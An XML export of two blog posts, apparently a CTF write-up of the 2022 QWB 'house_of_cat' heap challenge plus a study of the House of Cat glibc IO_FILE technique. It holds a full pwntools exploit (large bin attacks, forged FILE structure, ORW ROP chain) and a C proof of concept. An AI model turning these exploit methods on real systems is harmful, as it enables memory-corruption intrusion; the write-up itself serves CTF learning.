<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022强网杯house_of_cat</title>
    <url>/posts/2022qwbhouse_of_cat.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>[!IMPORTANT]</p>
<p>前面对<code>House of cat</code>的调用链进行了一个分析，这次通过例题来看下是如何实现的</p>
<p><a class="link"   href="http://www.berial.cn/post/House%20of%20cat%E8%B0%83%E8%AF%95" >House of Cat调用链调试<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h1 id="强网杯-2022-初赛-house-of-cat"><a href="#强网杯-2022-初赛-house-of-cat" class="headerlink" title="[强网杯 2022 初赛]house_of_cat"></a>[强网杯 2022 初赛]house_of_cat</h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240513123830518.png"
                      alt="image-20240513123830518"
                ><figcaption>image-20240513123830518</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240513124228537.png"
                      alt="image-20240513124228537"
                ><figcaption>image-20240513124228537</figcaption></figure></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先是是一个比较复杂的login函数，这里面就不放了，因为重点是伪造fake_io的流程</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOGIN | r00t QWB QWXFadmin</span><br><span class="line">CAT | r00t QWB QWXF$\xff</span><br></pre></td></tr></table></figure></div>

<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240513125836598.png"
                      alt="image-20240513125836598"
                ><figcaption>image-20240513125836598</figcaption></figure></p>
<p>限制了16个堆块，大小在0x418到0x470之间，使用的是calloc函数</p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240513130037330.png"
                      alt="image-20240513130037330"
                ><figcaption>image-20240513130037330</figcaption></figure></p>
<p>存在UAF漏洞</p>
<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240513130132802.png"
                      alt="image-20240513130132802"
                ><figcaption>image-20240513130132802</figcaption></figure></p>
<p>write 0x30大小</p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/img/image-20240513130217018.png"
                      alt="image-20240513130217018"
                ><figcaption>image-20240513130217018</figcaption></figure></p>
<p>edit有两次机会，并且只能修改0x30大小</p>
<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><h3 id="泄露堆地址及libc基址"><a href="#泄露堆地址及libc基址" class="headerlink" title="泄露堆地址及libc基址"></a>泄露堆地址及libc基址</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x440</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">base = uu64() - <span class="number">0x21a0d0</span></span><br><span class="line">useless = io.recv(<span class="number">8</span>+<span class="number">2</span>)</span><br><span class="line">heapbase = uheap() - <span class="number">0x290</span></span><br></pre></td></tr></table></figure></div>

<p>利用large bin泄露堆基地址和libc基地址</p>
<h3 id="伪造IO"><a href="#伪造IO" class="headerlink" title="伪造IO"></a>伪造IO</h3><p>用POC看的stderr结构体</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *stderr</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _flags = -72540026,</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x0,</span><br><span class="line">  _IO_write_ptr = 0x0,</span><br><span class="line">  _IO_write_end = 0x0,</span><br><span class="line">  _IO_buf_base = 0x0,</span><br><span class="line">  _IO_buf_end = 0x0,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x7ffff7e1a780 &lt;_IO_2_1_stdout_&gt;,</span><br><span class="line">  _fileno = 2,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x7ffff7e1ba60 &lt;_IO_stdfile_2_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x7ffff7e198a0 &lt;_IO_wide_data_2&gt;,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = 0,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后就是照着POC改，POC在另一篇文章中</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fake IO</span></span><br><span class="line">addr_IO = heapbase + <span class="number">0xb00</span></span><br><span class="line">fake = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#read_base &amp; write_base</span></span><br><span class="line">fake += p64(addr_IO + <span class="number">0xb0</span>)<span class="comment">#rdx:write_ptr</span></span><br><span class="line">fake += p64(setcontext)<span class="comment">#call_addr</span></span><br><span class="line">fake = fake.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)<span class="comment">#_chain</span></span><br><span class="line">fake = fake.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(heapbase + <span class="number">0x200</span>)<span class="comment">#_lock = writable addr</span></span><br><span class="line">fake = fake.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(addr_IO + <span class="number">0x30</span>)<span class="comment">#_wide_data:rax1</span></span><br><span class="line">fake = fake.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">1</span>) <span class="comment">#mode = 1</span></span><br><span class="line">fake = fake.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(base + <span class="number">0x2160c0</span> + <span class="number">0x10</span>)<span class="comment">#vtable --&gt; IO_wfile_jumps + 0x10</span></span><br><span class="line">fake += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake += p64(addr_IO + <span class="number">0x40</span>)<span class="comment">#rax2</span></span><br></pre></td></tr></table></figure></div>

<p>其实剩下的部分就是正常的高版本堆打ORW了，但是这部分还不是很熟练，需要多练，这里主要是加强对IO理解和House of cat调用链的一个学习</p>
<p>exp：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">banary = <span class="string">&quot;./house_of_cat&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;)</span></span><br><span class="line">ip = <span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28554</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">    <span class="comment">#io = process(banary, env=&#123;LD_LIBRARY:&#x27;./libc.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment">#io = process(banary,stdin=PTY,raw=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> a != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        gdb.attach(io, a)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x - y) + <span class="number">0x10000</span>) % <span class="number">0x10000</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">lss = <span class="keyword">lambda</span> s :log.success(<span class="string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">p = <span class="keyword">lambda</span> s: <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line">sa(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,<span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">&#x27;aaa&#x27;</span></span>):</span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x440</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">base = uu64() - <span class="number">0x21a0d0</span></span><br><span class="line">useless = io.recv(<span class="number">8</span>+<span class="number">2</span>)</span><br><span class="line">heapbase = uheap() - <span class="number">0x290</span></span><br><span class="line"><span class="comment"># -----</span></span><br><span class="line">pop_rsi = base + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = base + <span class="number">0x11f497</span></span><br><span class="line">pop_rdi = base + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rax = base + <span class="number">0x45eb0</span></span><br><span class="line">stderr = base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">setcontext = base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">write = base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read = base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">close = base + libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">syscall_ret = base + <span class="number">0x91396</span></span><br><span class="line">ret = base + <span class="number">0x29cd6</span></span><br><span class="line"><span class="comment"># -----</span></span><br><span class="line"><span class="comment"># fake IO</span></span><br><span class="line">addr_IO = heapbase + <span class="number">0xb00</span></span><br><span class="line">fake = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#read_base &amp; write_base</span></span><br><span class="line">fake += p64(addr_IO + <span class="number">0xb0</span>)<span class="comment">#rdx:write_ptr</span></span><br><span class="line">fake += p64(setcontext)<span class="comment">#call_addr</span></span><br><span class="line">fake = fake.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)<span class="comment">#_chain</span></span><br><span class="line">fake = fake.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(heapbase + <span class="number">0x200</span>)<span class="comment">#_lock = writable addr</span></span><br><span class="line">fake = fake.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(addr_IO + <span class="number">0x30</span>)<span class="comment">#_wide_data:rax1</span></span><br><span class="line">fake = fake.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">1</span>) <span class="comment">#mode = 1</span></span><br><span class="line">fake = fake.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(base + <span class="number">0x2160c0</span> + <span class="number">0x10</span>)<span class="comment">#vtable --&gt; IO_wfile_jumps + 0x10</span></span><br><span class="line">fake += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake += p64(addr_IO + <span class="number">0x40</span>)<span class="comment">#rax2</span></span><br><span class="line">flag = heapbase + <span class="number">0x17d0</span></span><br><span class="line">fake_pay = fake + p64(flag) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span> + p64(heapbase + <span class="number">0x2050</span>) + p64(ret)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x418</span>, fake_pay)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0</span>, p64(base + <span class="number">0x21a0d0</span>)*<span class="number">2</span> + p64(heapbase + <span class="number">0x290</span>) + p64(stderr - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x440</span>, <span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x430</span>, <span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line"><span class="comment"># orw_rop</span></span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(close)</span><br><span class="line">payload += p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall_ret)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(flag) + p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x430</span>, payload)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x450</span>, p64(<span class="number">0</span>)+p64(<span class="number">1</span>))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">5</span>, p64(base + <span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heapbase + <span class="number">0x1370</span>) + p64(heapbase + <span class="number">0x28e0</span> - <span class="number">0x20</span> + <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_assert</span></span><br><span class="line">sa(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat idx:&#x27;</span>,<span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span></span><br><span class="line">sla(<span class="string">&#x27;plz input your cat size:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x450</span>))</span><br><span class="line"></span><br><span class="line">p(<span class="string">&#x27;stderr&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;addr_IO&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Pwn</category>
        <category>IO_FILE</category>
        <category>House of cat</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>IO_FILE</tag>
        <tag>House of cat</tag>
      </tags>
  </entry>
  <entry>
    <title>House of cat调试</title>
    <url>/posts/Houseofcat%E8%B0%83%E8%AF%95.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉有好久都没学新知识了，对高版本堆和IO结构也不是很了解，借着团队里训练的录像好好学习一下</p>
<p>参考链接：[<a class="link"   href="https://bbs.kanxue.com/thread-273895.htm" >原创]House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解-Pwn-看雪-安全社区|安全招聘|kanxue.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<hr>
<h1 id="House-of-Cat"><a href="#House-of-Cat" class="headerlink" title="House of Cat"></a>House of Cat</h1><p>POC:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * stderr_ = libc_base + <span class="number">0x21a860</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> * ptr = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">size_t</span> heapbase = ptr - <span class="number">0x2a0</span>;</span><br><span class="line"></span><br><span class="line">    * stderr_ = ptr - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    ptr[<span class="number">0xf</span>] = heapbase + <span class="number">0x5000</span>; <span class="comment">//_lock</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span>;</span><br><span class="line">    ptr[<span class="number">0x19</span>] = _IO_wfile_jumps + <span class="number">0x10</span>;<span class="comment">//vtable</span></span><br><span class="line"></span><br><span class="line">    ptr[<span class="number">0x12</span>] = ptr - <span class="number">2</span>;<span class="comment">//wide_data</span></span><br><span class="line">    ptr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">3</span>] = <span class="number">0x1234</span>;</span><br><span class="line"></span><br><span class="line">    ptr[<span class="number">0x1a</span>] = ptr;</span><br><span class="line"></span><br><span class="line">    ptr[<span class="number">0x508</span>/<span class="number">8</span>] = <span class="number">0x55</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);<span class="comment">//__malloc_assert</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可利用版本：2.35及以前</p>
<p>这次主要是利用带源码调试的方式，一步一步的观察house of cat的调用链</p>
<h2 id="调用链1"><a href="#调用链1" class="headerlink" title="调用链1"></a>调用链1</h2><ul>
<li>卡在<code>_IO_flockfile</code>：fake_io没有在对应位置提供可写位置；—&gt;令fake_io-&gt;_lock为可写地址</li>
<li>通过虚表检测</li>
</ul>
<p>先从源码出手从__malloc_assert到_IO_wfile_seekoff是如何跳转的</p>
<p>通常是改掉topchunk的size和prev_size来触发__malloc_assert。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  va_end (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">	     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = <span class="built_in">stderr</span>;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

